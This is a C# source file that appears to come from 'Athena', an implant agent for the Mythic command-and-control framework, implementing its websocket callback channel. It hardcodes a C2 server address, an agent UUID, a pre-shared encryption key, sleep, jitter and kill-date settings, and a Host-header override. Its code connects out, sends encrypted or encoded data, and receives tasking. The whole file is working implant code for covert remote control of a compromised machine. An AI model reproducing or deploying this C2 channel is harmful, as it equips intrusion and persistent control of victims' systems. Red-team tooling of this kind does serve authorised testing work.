using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public Websocket currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public Forwarder forwarder;

        public MythicConfig()
        {
            this.uuid = "bf92542a-b397-4489-b127-af838d179d43";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("1", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("5", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new Websocket(this.uuid);
            this.forwarder = new Forwarder();
        }
    }

    public class Websocket
    {
        public string psk { get; set; }
        public string endpoint { get; set; }
        public string userAgent { get; set; }
        public string callbackHost { get; set; }
        public int callbackInterval { get; set; }
        public int callbackJitter { get; set; }
        public int callbackPort { get; set; }
        public string hostHeader { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public ClientWebSocket ws { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        public int connectAttempts { get; set; }

        public Websocket(string uuid)
        {
            int callbackPort = Int32.Parse("8081");
            string callbackHost = "ws://192.168.4.201";
            this.endpoint = "socket";
            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = "USER_AGENT";
            this.hostHeader = "%HOSTHEADER%";
            this.psk = "ub7bSS5aUkBYrog69/+p0vclNwWYXvTN/8WhCX8FVrA=";
            this.encryptedExchangeCheck = bool.Parse("false");
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }

            this.ws = new ClientWebSocket();

            if (!String.IsNullOrEmpty(this.hostHeader))
            {
                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
            }

            Connect(callbackURL);
        }

        public async Task<bool> Connect(string url)
        {
            this.connectAttempts = 0;
            try
            {
                ws = new ClientWebSocket();
                await ws.ConnectAsync(new Uri(url), CancellationToken.None);

                while (ws.State != WebSocketState.Open)
                {
                    if (this.connectAttempts == 300)
                    {
                        Environment.Exit(0);
                    }
                    await Task.Delay(3000);
                    this.connectAttempts++;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> Send(object obj)
        {
            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                WebSocketMessage m = new WebSocketMessage()
                {
                    Client = true,
                    Data = json,
                    Tag = ""
                };

                string message = JsonConvert.SerializeObject(m);
                byte[] msg = Encoding.UTF8.GetBytes(message);
                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                message = await Receive(ws);

                if (String.IsNullOrEmpty(message))
                {
                    return "";
                }

                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);

                if (this.encrypted)
                {
                    return this.crypt.Decrypt(m.Data);
                }
                else
                {
                    return (await Misc.Base64Decode(m.Data)).Substring(36);
                }
            }
            catch
            {
                return "";
            }
        }
        static async Task<string> Receive(ClientWebSocket socket)
        {
            try
            {
                var buffer = new ArraySegment<byte>(new byte[2048]);
                do
                {
                    WebSocketReceiveResult result;
                    using (var ms = new MemoryStream())
                    {
                        do
                        {
                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                            await ms.WriteAsync(buffer.Array, buffer.Offset, result.Count);
                        } while (!result.EndOfMessage);

                        if (result.MessageType == WebSocketMessageType.Close)
                            break;

                        ms.Seek(0, SeekOrigin.Begin);
                        using (var reader = new StreamReader(ms, Encoding.UTF8))
                            return (await reader.ReadToEndAsync());
                    }

                } while (true);

                return "";
            }
            catch
            {
                return "";
            }
        }
        private class WebSocketMessage
        {
            public bool Client { get; set; }
            public string Data { get; set; }
            public string Tag { get; set; }
        }
    }
}
